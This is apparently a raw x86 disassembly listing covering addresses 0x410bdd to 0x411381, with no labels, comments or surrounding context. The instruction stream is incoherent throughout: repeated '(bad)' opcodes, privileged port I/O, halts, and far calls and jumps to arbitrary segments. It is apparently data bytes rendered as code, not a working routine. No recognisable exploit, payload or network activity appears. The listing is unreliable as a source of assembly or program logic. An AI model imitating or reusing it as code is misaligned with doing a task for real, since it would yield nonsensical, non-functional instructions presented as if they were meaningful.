  410bdd:	shr    BYTE PTR [edi],cl
  410bdf:	cdq    
  410be0:	sub    al,0x7f
  410be2:	stos   BYTE PTR es:[edi],al
  410be3:	and    ebp,DWORD PTR [esi+0x29]
  410be6:	pushf  
  410be7:	xchg   ecx,eax
  410be8:	inc    edx
  410be9:	push   eax
  410bea:	mov    eax,0xd142db6b
  410bef:	sub    eax,0xdf401a38
  410bf4:	mul    bh
  410bf6:	mov    al,ds:0xae8fe364
  410bfb:	popf   
  410bfc:	jbe    0x410bd2
  410bfe:	adc    al,0x66
  410c00:	xor    ch,cl
  410c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c03:	and    bl,ah
  410c05:	adc    al,0x3d
  410c07:	mov    cl,0x71
  410c09:	mov    eax,ds:0xdf596c33
  410c0e:	sbb    bh,BYTE PTR [edx+0xd]
  410c11:	mov    ebp,0x81facbd6
  410c16:	cwde   
  410c17:	and    esi,eax
  410c19:	mov    al,0xe3
  410c1b:	sub    cl,al
  410c1d:	popa   
  410c1e:	popa   
  410c1f:	or     al,0xf5
  410c21:	sbb    al,0x42
  410c23:	test   DWORD PTR [ebx],ecx
  410c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c26:	(bad)  
  410c27:	jbe    0x410c9b
  410c29:	ins    BYTE PTR es:[edi],dx
  410c2a:	sub    al,BYTE PTR [edx-0x59d8ecb1]
  410c30:	jmp    0xf705df17
  410c35:	nop
  410c36:	icebp  
  410c37:	ja     0x410bc6
  410c39:	mov    ch,0xfd
  410c3b:	aas    
  410c3c:	mov    bh,0xd5
  410c3e:	out    dx,eax
  410c3f:	or     al,0x45
  410c41:	jge    0x410c7e
  410c43:	fisttp DWORD PTR [esi+0xd]
  410c46:	iret   
  410c47:	inc    esi
  410c48:	cmp    dl,BYTE PTR [esi-0x3]
  410c4b:	jg     0x410c24
  410c4d:	xchg   edi,eax
  410c4e:	mov    ch,0x5e
  410c50:	push   edi
  410c51:	jecxz  0x410c0a
  410c53:	sub    ebx,eax
  410c55:	xchg   esi,eax
  410c56:	out    dx,al
  410c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c58:	cmp    al,0x69
  410c5a:	xchg   ebp,eax
  410c5b:	dec    edi
  410c5c:	aam    0xb3
  410c5e:	retf   
  410c5f:	(bad)  
  410c60:	and    ebx,DWORD PTR ds:0x4e764c54
  410c66:	mov    ebx,0xd9677e88
  410c6b:	ss cmp al,0xd0
  410c6e:	cmp    DWORD PTR [esi+0x4f],edx
  410c71:	inc    esi
  410c72:	dec    edx
  410c73:	(bad)  
  410c74:	sub    eax,DWORD PTR [esi+0x6b]
  410c77:	sub    edi,eax
  410c79:	(bad)  
  410c7b:	or     bl,0x36
  410c7e:	das    
  410c7f:	mov    BYTE PTR [ebx],al
  410c81:	pop    ecx
  410c82:	xchg   ebp,eax
  410c83:	mov    al,ds:0x4b41dd
  410c88:	xchg   ecx,eax
  410c89:	cdq    
  410c8a:	aam    0xc6
  410c8c:	sbb    esp,DWORD PTR [ebp+0x4]
  410c8f:	push   esi
  410c90:	sahf   
  410c91:	inc    esp
  410c92:	and    ecx,DWORD PTR [esi+0x42870e3d]
  410c98:	mov    ds:0xcf8e037e,al
  410c9d:	fst    DWORD PTR [bp+di]
  410ca0:	xchg   ebp,eax
  410ca1:	pop    edi
  410ca2:	sahf   
  410ca3:	inc    esp
  410ca4:	in     eax,dx
  410ca5:	xchg   edx,eax
  410ca6:	iret   
  410ca7:	lds    esi,FWORD PTR [eax-0x76]
  410caa:	out    dx,eax
  410cab:	mov    cl,0xaa
  410cad:	cmp    esi,DWORD PTR [edi+0x32]
  410cb0:	call   0xd557:0xa06a29cd
  410cb7:	jo     0x410d0a
  410cb9:	clc    
  410cba:	cdq    
  410cbb:	jecxz  0x410d20
  410cbd:	mov    esi,0xc9e50dc4
  410cc2:	int3   
  410cc3:	jae    0x410c98
  410cc5:	gs out dx,al
  410cc7:	push   edx
  410cc8:	test   esi,0xce8664e7
  410cce:	or     ebx,DWORD PTR [ecx+0x2d5b173f]
  410cd4:	inc    edi
  410cd5:	mov    ch,0xa1
  410cd7:	mov    eax,0xa9d147ae
  410cdc:	sub    edx,DWORD PTR [edi]
  410cde:	sub    esp,DWORD PTR [ebx-0x683bea51]
  410ce4:	ins    BYTE PTR es:[edi],dx
  410ce5:	mov    bh,0xc9
  410ce7:	(bad)  
  410ce8:	pop    ebx
  410ce9:	cdq    
  410cea:	mov    WORD PTR [esi+0x2e985e1b],ds
  410cf0:	sub    ch,ah
  410cf2:	aam    0xfe
  410cf4:	mov    al,ds:0x7c920a27
  410cf9:	lods   al,BYTE PTR ds:[esi]
  410cfa:	and    ah,BYTE PTR [eax]
  410cfc:	out    0x9c,eax
  410cfe:	jle    0x410ca6
  410d00:	and    eax,0x596b7e8d
  410d05:	shl    DWORD PTR [esi],cl
  410d07:	push   ecx
  410d08:	xchg   eax,edi
  410d0a:	ins    DWORD PTR es:[edi],dx
  410d0b:	ret    0x113f
  410d0e:	fsub   QWORD PTR [edx-0x57f3e40c]
  410d14:	pop    eax
  410d15:	xor    esp,DWORD PTR [eax+0x615bdc86]
  410d1b:	lods   eax,DWORD PTR ds:[esi]
  410d1c:	mov    ah,0x9c
  410d1e:	(bad)  [edi+0x15afc7c]
  410d24:	stos   BYTE PTR es:[edi],al
  410d25:	push   ds
  410d26:	cdq    
  410d27:	pop    ebx
  410d28:	push   ebx
  410d29:	or     DWORD PTR [eax],ebx
  410d2b:	loopne 0x410cca
  410d2d:	sar    BYTE PTR [ecx],1
  410d2f:	out    0x34,al
  410d31:	inc    eax
  410d32:	test   al,0x22
  410d34:	mov    edi,gs
  410d36:	mov    esi,0x15502138
  410d3b:	bound  esp,QWORD PTR [ecx+0x42]
  410d3e:	fistp  QWORD PTR [ebp+0x5906b8a9]
  410d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d45:	mov    ah,al
  410d47:	pop    edx
  410d48:	cmp    ebx,DWORD PTR [ebx-0x3b]
  410d4b:	or     eax,0x4f7759d0
  410d50:	not    DWORD PTR [eax+ebx*2]
  410d53:	push   cs
  410d54:	inc    ecx
  410d55:	test   eax,ebx
  410d57:	fild   WORD PTR [ecx+0x5016ca47]
  410d5d:	call   0x9e95:0x7bcc7b93
  410d64:	jb     0x410dab
  410d66:	jo     0x410d1a
  410d68:	push   es
  410d69:	push   ecx
  410d6a:	sub    ebp,DWORD PTR [esi-0x7e0ca53f]
  410d70:	and    BYTE PTR [edx-0x4e37b210],ah
  410d76:	out    0x5b,eax
  410d78:	call   0x528:0x676942f6
  410d7f:	xchg   ecx,eax
  410d80:	(bad)  
  410d81:	mov    dh,0xe7
  410d83:	hlt    
  410d84:	xor    BYTE PTR [edi-0x5a],ch
  410d87:	pop    ebx
  410d88:	xchg   dh,bl
  410d8a:	je     0x410dbf
  410d8c:	aad    0xa5
  410d8e:	push   es
  410d8f:	xchg   DWORD PTR [edi+0x63],ebx
  410d92:	push   esp
  410d93:	(bad)  
  410d94:	div    dh
  410d96:	rcr    BYTE PTR [ecx+0x72bee0a],cl
  410d9c:	inc    BYTE PTR [edi-0x7a5ba302]
  410da2:	(bad)  
  410da4:	rcl    cl,1
  410da6:	cli    
  410da7:	sbb    eax,0xbe5153a8
  410dac:	ret    
  410dad:	fbld   TBYTE PTR [edi-0x766a15e1]
  410db3:	push   ebx
  410db4:	sti    
  410db5:	(bad)  
  410db6:	push   eax
  410db7:	ret    0x68cd
  410dba:	adc    eax,0x4402b148
  410dbf:	pop    esp
  410dc0:	jae    0x410df9
  410dc2:	idiv   BYTE PTR [ebx-0x5bbe2f75]
  410dc8:	icebp  
  410dc9:	cmp    eax,0x859f886b
  410dce:	stos   BYTE PTR es:[edi],al
  410dcf:	cmp    al,ch
  410dd1:	test   DWORD PTR [ecx],ebx
  410dd3:	jmp    0x410d65
  410dd5:	(bad)  
  410dd6:	fdivrp st(3),st
  410dd8:	jmp    0x410e13
  410dda:	sbb    ch,BYTE PTR [edx+0x65]
  410ddd:	enter  0x49b0,0xa3
  410de1:	add    eax,0x5a
  410de4:	xor    al,0x50
  410de6:	lahf   
  410de7:	neg    eax
  410de9:	mov    BYTE PTR [esi-0x8],dl
  410dec:	nop
  410ded:	mov    dl,0x39
  410def:	scas   eax,DWORD PTR es:[edi]
  410df0:	ins    DWORD PTR es:[edi],dx
  410df1:	fwait
  410df2:	mov    bl,0xb2
  410df4:	aad    0xdf
  410df6:	mov    al,0xae
  410df8:	add    al,0xa0
  410dfa:	xor    ebx,edx
  410dfc:	in     al,0xcd
  410dfe:	sbb    eax,0x1c7bc906
  410e03:	scas   eax,DWORD PTR es:[edi]
  410e04:	pop    ds
  410e05:	jg     0x410e18
  410e07:	dec    ebp
  410e08:	pop    edx
  410e09:	aad    0xb0
  410e0b:	mov    edx,0xa657d33b
  410e10:	dec    ecx
  410e11:	mov    ah,0x65
  410e13:	bound  ebx,QWORD PTR [edi]
  410e15:	xchg   esi,eax
  410e16:	pop    ecx
  410e17:	int3   
  410e18:	push   esp
  410e19:	cli    
  410e1a:	daa    
  410e1b:	or     ebp,DWORD PTR [edx+0x3b841100]
  410e21:	mov    DWORD PTR [edx+0x76],ebp
  410e24:	sahf   
  410e25:	(bad)  
  410e26:	fld    QWORD PTR [ebp+0x45]
  410e29:	scas   al,BYTE PTR es:[edi]
  410e2a:	lods   al,BYTE PTR ds:[esi]
  410e2b:	pushf  
  410e2c:	js     0x410e33
  410e2e:	mov    eax,ds:0x971cca91
  410e33:	jb     0x410e51
  410e35:	mov    bl,0x83
  410e37:	jo     0x410ea8
  410e39:	cmp    eax,0x25341f3c
  410e3e:	repz int 0xe6
  410e41:	fcom   DWORD PTR [ecx]
  410e43:	inc    edx
  410e44:	adc    DWORD PTR [edx],esp
  410e46:	retf   
  410e47:	mov    dl,0x3a
  410e49:	ret    
  410e4a:	mov    ch,ch
  410e4c:	gs mov dl,0xbf
  410e4f:	test   eax,0x7da6cd67
  410e54:	sub    al,0xf
  410e56:	xchg   ebx,eax
  410e57:	int3   
  410e58:	jecxz  0x410e66
  410e5a:	(bad)  
  410e5c:	sbb    cl,bh
  410e5e:	mov    ch,BYTE PTR [eax+0x69]
  410e61:	cmp    al,0xd3
  410e63:	cwde   
  410e64:	pop    ebp
  410e65:	(bad)  
  410e66:	and    eax,0x3d395bfb
  410e6b:	fstp   TBYTE PTR [edx+0x2b]
  410e6e:	adc    eax,0x9697324c
  410e73:	and    dl,BYTE PTR [ebx+0x36]
  410e76:	std    
  410e77:	(bad)  
  410e79:	push   ss
  410e7a:	push   edx
  410e7b:	cmp    eax,DWORD PTR [ebx+0x61218d72]
  410e81:	aad    0x87
  410e83:	test   DWORD PTR [edi+eax*2-0x6d],0xd832d8b3
  410e8b:	mov    ebp,0x7753be45
  410e90:	add    BYTE PTR [edi-0x2d],0x73
  410e94:	aaa    
  410e95:	jmp    0x410ed6
  410e97:	xchg   edx,eax
  410e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e9a:	pop    ds
  410e9b:	loop   0x410e86
  410e9d:	cmp    DWORD PTR [ebx+0x78],edi
  410ea0:	add    al,0xfd
  410ea2:	fwait
  410ea3:	pop    si
  410ea5:	lea    eax,[edi-0x2ddc6662]
  410eab:	and    BYTE PTR [eax+0x17141e5e],dl
  410eb1:	cmp    eax,0xa2ec5fff
  410eb6:	ror    BYTE PTR [eax-0x1d77a6cc],0x5d
  410ebd:	push   ebp
  410ebe:	lods   eax,DWORD PTR ds:[esi]
  410ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ec0:	push   ebp
  410ec1:	mov    eax,ds:0xb7bdab0b
  410ec6:	ja     0x410e80
  410ec8:	loopne 0x410e5e
  410eca:	int3   
  410ecb:	call   0x5dedcc3
  410ed0:	or     eax,0x2fd84820
  410ed5:	ins    BYTE PTR es:[edi],dx
  410ed6:	push   0x74d88fc9
  410edb:	add    dh,ch
  410edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ede:	cmp    eax,edi
  410ee0:	push   0xffffffe2
  410ee2:	inc    esi
  410ee3:	inc    eax
  410ee4:	ret    
  410ee5:	dec    ecx
  410ee6:	fidiv  WORD PTR [esi-0xc]
  410ee9:	mov    WORD PTR ds:0xfbf043eb,?
  410eef:	bound  eax,QWORD PTR [eax-0x63]
  410ef2:	repz add esi,DWORD PTR [ebx+0x68]
  410ef6:	mov    DWORD PTR [edi-0x5d],0xb79bb08a
  410efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410efe:	mov    edx,0x72465353
  410f03:	les    ecx,FWORD PTR [edx]
  410f05:	xchg   esi,eax
  410f06:	repz iret 
  410f08:	sbb    eax,0x6e94c535
  410f0d:	test   DWORD PTR [esi+0x21],edx
  410f10:	clc    
  410f11:	dec    edx
  410f12:	ins    DWORD PTR es:[edi],dx
  410f13:	pop    edx
  410f14:	lods   eax,DWORD PTR ds:[esi]
  410f15:	test   BYTE PTR [edi],0x14
  410f18:	stos   BYTE PTR es:[edi],al
  410f19:	jp     0x410ea0
  410f1b:	xchg   ebx,eax
  410f1c:	outs   dx,DWORD PTR ds:[esi]
  410f1d:	mov    ah,0x63
  410f1f:	js     0x410f52
  410f21:	lds    ecx,FWORD PTR [ebp-0x2c063fdc]
  410f27:	sub    DWORD PTR [edi+0x63],ebx
  410f2a:	push   eax
  410f2b:	jp     0x410f3d
  410f2d:	lds    ecx,FWORD PTR [edx]
  410f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f30:	inc    ecx
  410f31:	or     ah,al
  410f33:	dec    eax
  410f34:	cs and al,0x1c
  410f37:	mov    ecx,0x680b2676
  410f3c:	std    
  410f3d:	leave  
  410f3e:	pop    esi
  410f3f:	mov    esp,0xae6dca78
  410f44:	mov    ch,0xf7
  410f46:	push   edx
  410f47:	push   0x5d37fcf4
  410f4c:	fucomip st,st(0)
  410f4e:	jnp    0x410f1a
  410f50:	cmp    ebp,DWORD PTR [ecx]
  410f52:	fistp  WORD PTR [edx-0x34fddba6]
  410f58:	add    BYTE PTR [edx+0x7b],ch
  410f5b:	loop   0x410f95
  410f5d:	lahf   
  410f5e:	fdiv   st,st(1)
  410f60:	gs and bh,ch
  410f63:	push   0xffffff94
  410f65:	retf   
  410f66:	push   cs
  410f67:	push   ebx
  410f69:	xchg   BYTE PTR [ebp-0x7bedb8a7],dl
  410f6f:	add    eax,0xbd5d0e59
  410f74:	cs aam 0x47
  410f77:	retf   
  410f78:	mov    cs,WORD PTR [eax]
  410f7a:	out    0x48,al
  410f7c:	popa   
  410f7d:	inc    ebp
  410f7e:	frstor [esi+eax*4+0x6f5362ac]
  410f85:	jge    0x410f08
  410f87:	xchg   esi,eax
  410f88:	sar    esp,cl
  410f8a:	jp     0x410f11
  410f8c:	jg     0x410f54
  410f8e:	lds    esi,FWORD PTR [ecx]
  410f90:	sar    DWORD PTR [edi],cl
  410f92:	(bad)  
  410f94:	fbstp  TBYTE PTR [edx+0x23e0ee7f]
  410f9a:	jae    0x410f8a
  410f9c:	leave  
  410f9d:	sub    edx,DWORD PTR [edi-0x6d]
  410fa0:	xlat   BYTE PTR ds:[ebx]
  410fa1:	and    dl,BYTE PTR [edx]
  410fa3:	retf   0xc4a4
  410fa6:	add    bl,dl
  410fa8:	fstp   TBYTE PTR [esi]
  410faa:	adc    DWORD PTR [ebx+0x67],edx
  410fad:	jb     0x410fe9
  410faf:	shl    DWORD PTR [ebp-0x31],1
  410fb2:	xchg   ebx,eax
  410fb3:	push   0x36aff77a
  410fb8:	sub    dh,BYTE PTR [ebx-0x6b]
  410fbb:	pop    ss
  410fbc:	xchg   ebx,eax
  410fbd:	out    0x15,eax
  410fbf:	xor    eax,0xc753bfab
  410fc4:	sbb    BYTE PTR [ecx-0x16],ah
  410fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fc8:	adc    esi,DWORD PTR [esi+0x9024dca]
  410fce:	out    0x79,eax
  410fd0:	mov    ds:0x2489ec70,al
  410fd5:	stos   DWORD PTR es:[edi],eax
  410fd6:	adc    bl,BYTE PTR [eax+0xa6e030a]
  410fdc:	xchg   esp,eax
  410fdd:	pop    edi
  410fde:	add    eax,0xcf40e391
  410fe3:	leave  
  410fe4:	std    
  410fe5:	jmp    0xaf74:0x5c745090
  410fec:	mov    bl,0x78
  410fee:	dec    esi
  410fef:	add    BYTE PTR [ebx-0x71d70d0],ah
  410ff5:	xchg   ebx,eax
  410ff6:	pushf  
  410ff7:	sub    bh,BYTE PTR [edi+0x6c]
  410ffa:	mov    edi,0xefb94c84
  410fff:	outs   dx,BYTE PTR ds:[esi]
  411000:	pop    esi
  411001:	adc    DWORD PTR ds:0xc535bec9,ebx
  411007:	sahf   
  411008:	ret    0x54f7
  41100b:	mov    eax,ds:0xa6653dc7
  411010:	call   0x18eaff48
  411015:	fdivr  st(0),st
  411017:	xor    eax,0x6e3701cb
  41101c:	nop
  41101d:	ficom  WORD PTR [edi]
  41101f:	xchg   edx,eax
  411020:	fs mov bl,0xfd
  411023:	inc    edi
  411024:	add    BYTE PTR [edx+0x20e051d3],dl
  41102a:	inc    BYTE PTR [ebp+edx*8-0x4c44eef6]
  411031:	xor    edi,esp
  411033:	aaa    
  411034:	call   0xcbfa:0x2d9b19c0
  41103b:	jb     0x410fd6
  41103d:	adc    DWORD PTR [eax-0x1b],eax
  411040:	jp     0x41105f
  411042:	fdivr  DWORD PTR [ebp+edx*8-0x75]
  411046:	add    ebp,edi
  411048:	mov    edx,0xa7e979e
  41104d:	ins    DWORD PTR es:[edi],dx
  41104e:	mov    ebp,0x75768eb8
  411053:	inc    ebx
  411054:	dec    edi
  411055:	repz je 0x410fe8
  411058:	mov    esp,0x73f4ef35
  41105d:	or     DWORD PTR [edx-0x2a],eax
  411060:	cdq    
  411061:	mov    ds:0x204d61e8,eax
  411066:	test   BYTE PTR [esi+0x56],bh
  411069:	(bad)  
  41106a:	or     BYTE PTR [edi],0x18
  41106d:	imul   edx,DWORD PTR [edi],0xffffffa8
  411070:	jg     0x4110bb
  411072:	imul   BYTE PTR [ecx]
  411074:	sahf   
  411075:	sub    eax,ebp
  411077:	imul   esp,DWORD PTR [edx+0x8],0x5a39370
  41107e:	or     al,0xa3
  411080:	call   0x3e772a35
  411085:	sbb    eax,0x8382e00d
  41108a:	rol    BYTE PTR ds:0xe1c54081,cl
  411090:	mov    al,bl
  411092:	or     dl,al
  411094:	adc    al,0x29
  411096:	xlat   BYTE PTR ds:[ebx]
  411097:	not    BYTE PTR [ecx+0x2a]
  41109a:	adc    eax,0x80823d47
  41109f:	nop
  4110a0:	mov    cl,0x3e
  4110a2:	push   0x29
  4110a4:	mov    dh,0x39
  4110a6:	push   edi
  4110a7:	inc    edi
  4110a8:	clc    
  4110a9:	jmp    0xb5aa:0xd824661
  4110b0:	push   es
  4110b1:	push   edx
  4110b2:	sub    ebp,DWORD PTR [esi+0x5c0a6c1b]
  4110b8:	call   0x2f37:0x8ab31485
  4110bf:	jl     0x411116
  4110c1:	sbb    ch,BYTE PTR [edx-0x52b77223]
  4110c7:	pop    ds
  4110c8:	jmp    0x2b294ffb
  4110cd:	jnp    0x4110a7
  4110cf:	mov    ecx,0x2bc8a2e0
  4110d4:	pushf  
  4110d5:	inc    ecx
  4110d6:	jecxz  0x4110ab
  4110d8:	adc    esi,0xfca08cc9
  4110de:	enter  0x2261,0x7e
  4110e2:	call   0x52536f9e
  4110e7:	icebp  
  4110e8:	jle    0x411159
  4110ea:	out    0x97,eax
  4110ec:	les    eax,FWORD PTR [esi+0x70]
  4110ef:	adc    esi,DWORD PTR gs:[eax]
  4110f2:	xchg   esi,eax
  4110f3:	and    al,0x39
  4110f5:	ja     0x4110b2
  4110f7:	push   edi
  4110f8:	adc    ah,bl
  4110fa:	(bad)  
  4110fb:	xchg   edi,eax
  4110fc:	dec    ebp
  4110fd:	arpl   WORD PTR [ebp+0x34],ax
  411100:	outs   dx,BYTE PTR ds:[esi]
  411101:	aas    
  411102:	xor    DWORD PTR ds:0xbdb61634,edx
  411108:	call   eax
  41110a:	clc    
  41110b:	ror    DWORD PTR [ecx],0x60
  41110e:	push   eax
  41110f:	daa    
  411110:	or     edx,ebp
  411112:	sti    
  411113:	xchg   ebp,eax
  411114:	mov    esi,0x45d2fb2c
  411119:	mov    ch,0xc9
  41111b:	pop    esi
  41111c:	test   dl,0xf0
  41111f:	mov    al,ds:0xa4064524
  411124:	or     BYTE PTR [edx-0x5c2261a0],0xb7
  41112b:	and    ah,BYTE PTR [eax-0x5eff78b9]
  411131:	out    dx,eax
  411132:	lock dec eax
  411134:	lock cmp BYTE PTR [ebp-0x1c],0xdd
  411139:	jae    0x4110be
  41113b:	loopne 0x4110f4
  41113d:	(bad)  
  41113e:	fist   WORD PTR [ebx]
  411140:	push   0x7a03564e
  411145:	call   0xf19e:0x49fa1969
  41114c:	xor    eax,0xd8aa6b3a
  411151:	dec    esp
  411152:	stos   BYTE PTR es:[edi],al
  411153:	fwait
  411154:	add    BYTE PTR [edx-0x3aebb31a],ch
  41115a:	mov    DWORD PTR [edi-0x46],edi
  41115d:	mov    esp,0x52eff0f4
  411162:	and    bl,BYTE PTR [ebx-0x28]
  411165:	in     al,0x1a
  411167:	inc    esi
  411168:	xchg   esi,eax
  411169:	int    0xb3
  41116b:	mov    cl,0xa4
  41116d:	enter  0x44f2,0x44
  411171:	cmp    eax,0xd616c518
  411176:	jo     0x4111e5
  411178:	sub    cl,BYTE PTR [eax+edi*1]
  41117b:	stos   DWORD PTR es:[edi],eax
  41117c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41117d:	jge    0x4111b5
  41117f:	pop    edx
  411180:	call   0x76622743
  411185:	inc    esi
  411186:	jle    0x4111ee
  411188:	ficomp WORD PTR [esi+0x588e8b04]
  41118e:	repnz lds ebp,FWORD PTR ds:0x437ff9e6
  411195:	jmp    FWORD PTR es:[esi+0x2eaa4663]
  41119c:	in     eax,dx
  41119d:	or     ah,BYTE PTR [eax-0x1b]
  4111a0:	push   ds
  4111a1:	dec    DWORD PTR [ebp+0x3453a1eb]
  4111a7:	push   esp
  4111a8:	dec    ebp
  4111a9:	enter  0x44d,0x13
  4111ad:	jmp    0x80b78677
  4111b2:	mov    eax,ds:0xd2f9508
  4111b7:	loop   0x411174
  4111b9:	adc    dl,BYTE PTR [edi+0x761f47ee]
  4111bf:	jae    0x41117c
  4111c1:	int3   
  4111c2:	stos   BYTE PTR es:[edi],al
  4111c3:	push   edi
  4111c4:	adc    ah,BYTE PTR [eax+edx*8-0x70]
  4111c8:	(bad)  
  4111c9:	fdivr  QWORD PTR [ebp-0x4f]
  4111cc:	sbb    ecx,DWORD PTR [esi+edi*8]
  4111cf:	xor    al,0x16
  4111d1:	adc    al,0xbe
  4111d3:	xchg   esi,eax
  4111d4:	into   
  4111d5:	and    al,0x4c
  4111d7:	xchg   esp,eax
  4111d8:	aas    
  4111d9:	iret   
  4111da:	mov    WORD PTR [ecx],fs
  4111dc:	xor    ch,al
  4111de:	or     eax,0x9ad9e99f
  4111e3:	mov    dl,0x1f
  4111e5:	inc    ebx
  4111e6:	jo     0x4111c7
  4111e8:	inc    eax
  4111e9:	jg     0x411198
  4111eb:	pop    ss
  4111ec:	push   cs
  4111ed:	retf   
  4111ee:	inc    esp
  4111ef:	mov    al,0x70
  4111f1:	mov    eax,0x84589e40
  4111f6:	cwde   
  4111f7:	jb     0x4111a3
  4111f9:	faddp  st(5),st
  4111fb:	int3   
  4111fc:	sub    ebx,ebp
  4111fe:	ins    BYTE PTR es:[edi],dx
  4111ff:	push   esi
  411200:	fld    DWORD PTR ds:0x39bc3981
  411206:	inc    eax
  411207:	into   
  411208:	xchg   DWORD PTR [ebx],ebx
  41120a:	mov    al,ds:0x568c7948
  41120f:	push   ebp
  411210:	sbb    esp,DWORD PTR [ebp+0x21]
  411213:	push   ebp
  411214:	sahf   
  411215:	xor    edi,edi
  411217:	outs   dx,BYTE PTR ds:[esi]
  411218:	inc    eax
  411219:	sahf   
  41121a:	xchg   ebp,eax
  41121b:	stos   DWORD PTR es:[edi],eax
  41121c:	lea    ecx,[esi+0x6af59c3b]
  411222:	div    ecx
  411224:	xor    cl,al
  411226:	dec    edx
  411227:	stc    
  411228:	fisttp DWORD PTR [edi]
  41122a:	pop    ss
  41122b:	loope  0x4111e2
  41122d:	or     eax,DWORD PTR [ecx-0x57]
  411230:	xchg   ebp,eax
  411231:	in     al,dx
  411232:	jmp    0x411294
  411234:	shr    DWORD PTR [eax+eax*4+0x55],1
  411238:	cmp    BYTE PTR [edi-0x61],cl
  41123b:	xchg   esp,eax
  41123c:	jb     0x411286
  41123e:	dec    ebp
  41123f:	outs   dx,BYTE PTR ds:[esi]
  411240:	mov    ebp,0xf874769a
  411245:	cmp    BYTE PTR [ebx],cl
  411247:	dec    ebp
  411248:	pop    ecx
  411249:	pop    ebx
  41124a:	push   esi
  41124b:	das    
  41124c:	push   0x48eb9a46
  411251:	int    0x42
  411253:	mov    eax,0xd98cd247
  411258:	fld    QWORD PTR [eax*8-0xc566739]
  41125f:	xor    BYTE PTR [eax+0x441439cc],bl
  411265:	add    ebx,ebp
  411267:	ds add al,0xa0
  41126a:	sbb    al,0xb9
  41126c:	imul   eax,DWORD PTR [eax],0x2d82751e
  411272:	xor    al,0x9d
  411274:	inc    ebp
  411275:	fst    DWORD PTR [edi+0x4a]
  411278:	inc    edx
  411279:	imul   DWORD PTR [edx+0x18]
  41127c:	or     edx,0x7c50e47d
  411282:	xchg   DWORD PTR [ecx-0x6429e0cf],esp
  411288:	push   0xc
  41128a:	mov    edx,0x210993ff
  41128f:	or     edx,DWORD PTR [ecx]
  411291:	push   edi
  411292:	add    ecx,DWORD PTR [ecx+0x35]
  411295:	jbe    0x4112e1
  411297:	add    ecx,DWORD PTR [eax]
  411299:	fwait
  41129a:	stos   BYTE PTR es:[edi],al
  41129b:	sbb    DWORD PTR [ecx-0x44],ebp
  41129e:	sub    al,0x34
  4112a0:	add    DWORD PTR [ebp+0x6a],0xffffff8a
  4112a4:	out    dx,al
  4112a5:	jnp    0x411283
  4112a7:	adc    eax,0xe2945c7f
  4112ac:	out    0x97,eax
  4112ae:	sbb    DWORD PTR [ebx+0x9f34c5b],edx
  4112b4:	mov    ds:0x9dfb2732,eax
  4112b9:	shl    DWORD PTR [edx+0x6755d16a],0x46
  4112c0:	jecxz  0x41131b
  4112c2:	(bad)  
  4112c3:	(bad)  [ebp+0x1c]
  4112c6:	outs   dx,DWORD PTR ds:[esi]
  4112c7:	xor    BYTE PTR [edx+ecx*8+0x6bc00efe],ah
  4112ce:	in     eax,0xbc
  4112d0:	aam    0xc0
  4112d2:	inc    esi
  4112d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d4:	int3   
  4112d5:	xlat   BYTE PTR ds:[ebx]
  4112d6:	xchg   edi,eax
  4112d7:	test   al,0x8
  4112d9:	jge    0x411263
  4112db:	dec    esi
  4112dc:	xchg   ah,dl
  4112de:	xchg   DWORD PTR [edi],eax
  4112e0:	aam    0x45
  4112e2:	call   0xf4f2:0x1b8dbaa7
  4112e9:	jp     0x411316
  4112eb:	dec    ecx
  4112ec:	jae    0x411280
  4112ee:	ret    
  4112ef:	or     al,0x49
  4112f1:	pop    ebp
  4112f2:	add    al,0xf2
  4112f4:	push   ebp
  4112f5:	mov    edx,DWORD PTR [ebx-0x37]
  4112f8:	(bad)  
  4112f9:	mov    ah,bl
  4112fb:	hlt    
  4112fc:	test   dl,bh
  4112fe:	add    dh,BYTE PTR ds:0x7ae50922
  411304:	fcmovbe st,st(6)
  411306:	push   ebx
  411307:	stos   BYTE PTR es:[edi],al
  411308:	imul   edi,DWORD PTR [eax],0xffffff8d
  41130b:	rcr    DWORD PTR ds:[ebp-0x3d98e6a0],0x87
  411313:	mov    ?,WORD PTR [edx+0x77]
  411316:	sbb    ebp,ebp
  411318:	leave  
  411319:	pop    es
  41131a:	mov    ch,0x62
  41131c:	pusha  
  41131d:	aaa    
  41131e:	and    BYTE PTR [eax],0xf3
  411321:	pop    esi
  411322:	leave  
  411323:	lock sti 
  411325:	xor    BYTE PTR [edx-0x57],dl
  411328:	lods   eax,DWORD PTR ds:[esi]
  411329:	jmp    DWORD PTR [esi]
  41132b:	adc    al,0xae
  41132d:	mov    ebx,0xebfe1793
  411332:	cmp    BYTE PTR [esi-0x1f],bh
  411335:	mov    dl,0x9b
  411337:	xchg   ebx,eax
  411338:	xchg   edx,eax
  411339:	sar    edi,0x37
  41133c:	leave  
  41133d:	pop    edx
  41133e:	or     eax,0x73d9e986
  411343:	retf   0xddf0
  411346:	stos   DWORD PTR es:[edi],eax
  411347:	push   ebp
  411348:	push   edx
  411349:	pop    ecx
  41134a:	arpl   WORD PTR [edi],ax
  41134c:	pop    ecx
  41134d:	cmp    dl,BYTE PTR [ebp-0x49]
  411350:	lea    esp,[ecx-0x7d]
  411353:	(bad)  
  411354:	jmp    0x5577:0xab2602f6
  41135b:	repnz pop esi
  41135d:	push   esp
  41135e:	adc    BYTE PTR [eax-0x5f],0x95
  411362:	out    0x73,al
  411364:	or     DWORD PTR [ebx],edx
  411366:	xchg   edx,eax
  411367:	jmp    0x6403:0x649d48fa
  41136e:	sub    DWORD PTR [edi+0x644453d0],0x5d
  411375:	or     BYTE PTR [esi+eax*8],dh
  411378:	fisttp DWORD PTR [ebx]
  41137a:	pop    ecx
  41137b:	scas   al,BYTE PTR es:[edi]
  41137c:	mov    eax,0x1d175b8
  411381:	aam    0xe7
